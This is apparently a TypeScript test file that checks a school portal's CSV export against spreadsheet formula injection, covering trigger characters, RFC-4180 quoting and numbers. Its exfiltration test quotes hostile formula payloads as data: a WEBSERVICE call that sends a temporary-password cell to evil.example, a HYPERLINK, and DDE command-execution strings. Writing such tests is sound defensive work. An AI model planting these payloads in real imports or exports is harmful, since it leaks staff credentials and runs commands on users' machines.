// Security regression tests for CSV export encoding. Run with:
//   npx tsx scripts/csv-export.test.ts
//
// These cover CSV/formula injection (OWASP "CSV Injection"): student and staff
// names reach the portal from bulk SIS/CSV imports, and the portal exports them
// again as spreadsheets staff open in Excel. A cell beginning with = + - @ or a
// tab/CR is a formula, so an imported name could exfiltrate the row it sits in
// — including the temporary-password column of the staff credentials export.

import assert from 'node:assert/strict';
import { csvCell, toCsv } from '../src/lib/csv-export';

let testCount = 0;
function test(name: string, fn: () => void) {
  testCount++;
  try {
    fn();
    console.log(`  ✓ ${name}`);
  } catch (err) {
    console.error(`  ✗ ${name}`);
    throw err;
  }
}

test('a formula cell is neutralised so a spreadsheet treats it as text', () => {
  assert.equal(csvCell('=1+1'), "'=1+1");
});

/** The cell as the spreadsheet will see it, with any RFC-4180 wrapper removed. */
function asDisplayed(encoded: string): string {
  return encoded.startsWith('"') ? encoded.slice(1, -1).replace(/""/g, '"') : encoded;
}

test('the exfiltration payloads are neutralised', () => {
  // Would otherwise POST the adjacent cell (a temp password) to an attacker.
  assert.equal(
    csvCell('=WEBSERVICE("https://evil.example/?p="&D2)'),
    `"'=WEBSERVICE(""https://evil.example/?p=""&D2)"`
  );
  // Note these also need RFC-4180 quoting (they contain commas/quotes), so the
  // neutralising apostrophe sits inside the wrapper — check what the
  // spreadsheet actually parses, not the raw bytes.
  assert.ok(asDisplayed(csvCell('=HYPERLINK("https://evil.example","CLICK")')).startsWith("'="));
  // Legacy DDE command execution.
  assert.ok(asDisplayed(csvCell("=cmd|'/c calc.exe'!A1")).startsWith("'="));
});

test('every formula trigger character is covered', () => {
  for (const payload of ['=A1', '+A1', '-A1', '@SUM(A1)', '\tA1', '\rA1']) {
    assert.equal(
      asDisplayed(csvCell(payload))[0],
      "'",
      `not neutralised: ${JSON.stringify(payload)}`
    );
  }
});

test('ordinary names are left exactly as they are', () => {
  assert.equal(csvCell('Ada Nguyen'), 'Ada Nguyen');
  assert.equal(csvCell('Prep A'), 'Prep A');
  assert.equal(csvCell("O'Brien"), "O'Brien"); // apostrophe inside, not leading
});

test('numbers are never quote-prefixed', () => {
  // Prefixing would turn a real total into text in the spreadsheet.
  assert.equal(csvCell(0), '0');
  assert.equal(csvCell(42), '42');
  assert.equal(csvCell(-5), '-5');
  assert.equal(csvCell(NaN), '');
});

test('RFC-4180 quoting still applies', () => {
  assert.equal(csvCell('Nguyen, Jr'), '"Nguyen, Jr"');
  assert.equal(csvCell('She said "hi"'), '"She said ""hi"""');
  assert.equal(csvCell('line1\nline2'), '"line1\nline2"');
  assert.equal(csvCell(null), '');
  assert.equal(csvCell(undefined), '');
});

test('a formula that also needs quoting gets both treatments', () => {
  const encoded = csvCell('=SUM(A1,B1)');
  assert.equal(encoded, `"'=SUM(A1,B1)"`);
});

test('toCsv builds CRLF rows and neutralises within them', () => {
  const csv = toCsv([
    ['Name', 'Minutes'],
    ['=cmd|calc', 12],
  ]);
  assert.equal(csv, "Name,Minutes\r\n'=cmd|calc,12");
});

console.log(`\nAll ${testCount} tests passed.`);
